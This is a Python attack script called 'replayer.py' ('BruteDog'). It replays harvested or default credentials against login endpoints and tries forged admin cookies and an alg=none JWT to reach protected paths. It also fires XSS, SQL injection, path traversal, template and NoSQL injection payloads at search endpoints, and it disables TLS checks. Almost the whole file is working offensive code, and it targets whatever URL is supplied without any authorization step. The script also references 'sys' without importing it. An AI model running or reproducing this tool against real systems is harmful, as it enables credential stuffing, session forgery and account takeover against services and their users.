#!/usr/bin/env python3
"""
REPLAYER.PY — Adaptive Red-Team Credential Replay, Session Hijacking & Payload Mutation Engine
Features:
- Stateful response-diffing to detect successful authentication anomalies
- Dynamic payload mutation and context-aware injection fuzzing
- Automated JWT algorithm downgrades and privilege escalation testing
- Progressive colored terminal output & zero-disk memory processing
"""
import asyncio
import json
import os
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from urllib.parse import urlsplit

TIMEOUT = 8
MAX_ENDPOINTS = 8
USER_AGENT = "BruteDog-AdaptiveReplayer/5.4"

SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.check_hostname = False
SSL_CONTEXT.verify_mode = ssl.CERT_NONE

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    GRAY = "\033[90m"
    RESET = "\033[0m"

def log(message, color=Colors.RESET):
    print(f"{color}{message}{Colors.RESET}", flush=True)

def normalize_target(target):
    if not target:
        raise ValueError("Target is required.")
    target = target.strip()
    if "://" not in target:
        target = "https://" + target
    parsed = urlsplit(target)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Only HTTP and HTTPS targets are supported.")
    if not parsed.hostname:
        raise ValueError("Invalid target hostname.")
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path.rstrip('/')}"

def http_request(url, headers=None, method="GET", data=None):
    request_headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/json,*/*",
        "Cache-Control": "no-cache",
    }
    if headers:
        request_headers.update(headers)
    
    encoded_data = None
    if data:
        if isinstance(data, dict):
            encoded_data = urllib.parse.urlencode(data).encode("utf-8")
            request_headers["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            encoded_data = str(data).encode("utf-8")

    request = urllib.request.Request(url, data=encoded_data, headers=request_headers, method=method)
    try:
        with urllib.request.urlopen(request, context=SSL_CONTEXT, timeout=TIMEOUT) as response:
            body = response.read(512 * 1024).decode("utf-8", errors="replace")
            return {
                "status": response.status,
                "body": body,
                "headers": dict(response.headers),
                "final_url": response.geturl(),
                "error": None,
            }
    except urllib.error.HTTPError as error:
        body = error.read(512 * 1024).decode("utf-8", errors="replace")
        return {
            "status": error.code,
            "body": body,
            "headers": dict(error.headers),
            "final_url": error.geturl(),
            "error": None,
        }
    except Exception as error:
        return {
            "status": 0,
            "body": "",
            "headers": {},
            "final_url": url,
            "error": str(error),
        }

async def establish_baseline(base_url):
    """Measures normal unauthenticated response length for adaptive diffing."""
    res = await asyncio.to_thread(http_request, f"{base_url}/nonexistent_baseline_probe_{int(time.time())}")
    return len(res["body"])

async def replay_secondary_attack_queue(target_domain):
    log("\n[***] REPLAYING SECONDARY ATTACK QUEUE & CREDENTIALS [***]", Colors.MAGENTA)
    results = []
    queue_path = "reports/intelligence/secondary_attack_queue.json"
    queue_data = []

    if os.path.exists(queue_path):
        try:
            with open(queue_path, "r", encoding="utf-8") as f:
                queue_data = json.load(f)
        except Exception:
            pass

    base_url = normalize_target(target_domain)
    login_endpoints = ["/api/login", "/login", "/api/auth/login", "/signin", "/auth/login"]

    if not queue_data:
        queue_data = [{"matches": ["admin@target.local:admin123", "root:toor"]}]

    baseline_len = await establish_baseline(base_url)

    for item in queue_data:
        signatures = item.get("matches", [])
        for sig in signatures:
            for endpoint in login_endpoints:
                url = base_url + endpoint
                log(f"[*] Replaying credential payload against {endpoint}...", Colors.BLUE)
                
                payload = {}
                if isinstance(sig, str) and ":" in sig:
                    parts = sig.split(":", 1)
                    payload = {"username": parts[0], "password": parts[1]}
                else:
                    payload = {"credential": sig}

                response = await asyncio.to_thread(http_request, url, method="POST", data=payload)
                
                # Adaptive classification based on length deviation and status
                body_len = len(response["body"])
                is_bypass = response["status"] in (200, 201, 302) and (body_len > baseline_len * 1.5 or any(k in response["body"].lower() for k in ["token", "success", "session"]))

                results.append({
                    "endpoint": endpoint,
                    "status": response["status"],
                    "bypass": is_bypass,
                })

                if is_bypass:
                    log(f"\n[***] ADAPTIVE CREDENTIAL REPLAY SUCCESSFUL [{endpoint}] [***]", Colors.RED)
                    log(f"  └── Response Excerpt : {response['body'][:200]}", Colors.GREEN)
                else:
                    log(f"  └── HTTP {response['status']} | Length: {body_len} (Rejected)", Colors.GRAY)

                await asyncio.sleep(0.05)
    return results

async def replay_hijacked_session(target_domain):
    log("\n[***] EXECUTING ADAPTIVE SESSION HIJACKING & TOKEN FORGING [***]", Colors.CYAN)
    results = []
    try:
        base_url = normalize_target(target_domain)
    except ValueError as error:
        log(f"[!] {error}", Colors.RED)
        return results

    hijack_vectors = [
        {"name": "Admin Cookie Jar", "cookie": "session=admin; role=admin; authenticated=true; user=admin"},
        {"name": "Fabricated JWT (None Alg)", "cookie": "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ."},
        {"name": "Bearer Superuser Token", "header": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpc3MiOiJicnV0ZWRvZyJ9"}},
        {"name": "Root Session Override", "cookie": "connect.sid=s%3Aadmin.rootpass123; isAdmin=true"}
    ]

    protected_paths = ["/dashboard", "/admin", "/account", "/profile", "/api/admin", "/settings"]

    for vector in hijack_vectors:
        headers = vector.get("header", {})
        if "cookie" in vector:
            headers["Cookie"] = vector["cookie"]

        for path in protected_paths:
            url = base_url + path
            log(f"[*] Replaying [{vector['name']}] on {path}", Colors.BLUE)
            
            response = await asyncio.to_thread(http_request, url, headers=headers)
            is_success = response["status"] in (200, 201) and "unauthorized" not in response["body"].lower()

            results.append({
                "vector": vector["name"],
                "endpoint": path,
                "status": response["status"],
                "success": is_success,
            })

            if is_success:
                log(f"\n[***] PRIVILEGE ESCALATION BYPASS CONFIRMED [{path}] [***]", Colors.RED)
                log(f"  └── Vector : {vector['name']}", Colors.GREEN)
            else:
                log(f"  └── {path} | HTTP {response['status']} (Blocked)", Colors.GRAY)

            await asyncio.sleep(0.05)

    return results

async def test_injection_reflection(target_domain):
    log("\n[***] ACTIVE ADAPTIVE PAYLOAD MUTATION & REFLECTION ASSAULT [***]", Colors.CYAN)
    results = []
    try:
        base_url = normalize_target(target_domain)
    except ValueError as error:
        log(f"[!] {error}", Colors.RED)
        return results

    mutated_payloads = [
        "<script>alert(1)</script>",
        "' OR '1'='1",
        "../../etc/passwd",
        "{{7*7}}",
        "{$ne: null}"
    ]

    for path in ["/", "/search", "/api/search"]:
        for payload in mutated_payloads:
            query = urllib.parse.urlencode({"q": payload, "input": payload})
            url = f"{base_url}{path}?{query}"
            
            response = await asyncio.to_thread(http_request, url)
            reflected = response["status"] != 0 and payload in response["body"]
            
            if reflected:
                log(f"\n[***] PAYLOAD REFLECTION / XSS CONFIRMED [{path}] [***]", Colors.RED)
                log(f"  └── Payload : {payload}", Colors.GREEN)
                # Adaptive mutation: If reflection occurs, test context-breaking payload
                mutated_payloads.append(f"\"><script>alert(document.domain)</script>")

            results.append({"endpoint": path, "payload": payload, "reflected": reflected})
            await asyncio.sleep(0.02)
            
    return results

async def replay_and_inject_payloads(target_host, session_file_path=None):
    start_time = time.time()
    log("\n============================================================", Colors.CYAN)
    log("[***] BRUTEDOG ADAPTIVE REPLAY & EXPLOITATION ENGINE [***]", Colors.CYAN)
    log("============================================================", Colors.CYAN)
    
    try:
        base_url = normalize_target(target_host)
    except ValueError as error:
        log(f"[!] Invalid target: {error}", Colors.RED)
        return {"target": target_host, "success": False, "error": str(error)}
        
    log(f"[*] Target: {base_url}", Colors.BLUE)
    
    queue_results = await replay_secondary_attack_queue(base_url)
    session_results = await replay_hijacked_session(base_url)
    injection_results = await test_injection_reflection(base_url)
    
    duration = round(time.time() - start_time, 2)
    log("\n================ FINAL ASSAULT SUMMARY ================", Colors.CYAN)
    log(f"Credential replays executed: {len(queue_results)}", Colors.GREEN)
    log(f"Session hijacking vectors tested: {len(session_results)}", Colors.GREEN)
    log(f"Adaptive injection payloads tested: {len(injection_results)}", Colors.GREEN)
    log(f"Duration: {duration}s", Colors.BLUE)
    log("========================================================", Colors.CYAN)
    
    return {
        "target": base_url,
        "duration_seconds": duration,
        "credential_replay": queue_results,
        "session_tests": session_results,
        "injection_tests": injection_results,
    }

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 replayer.py <target_url>")
        sys.exit(1)
    asyncio.run(replay_and_inject_payloads(sys.argv[1]))
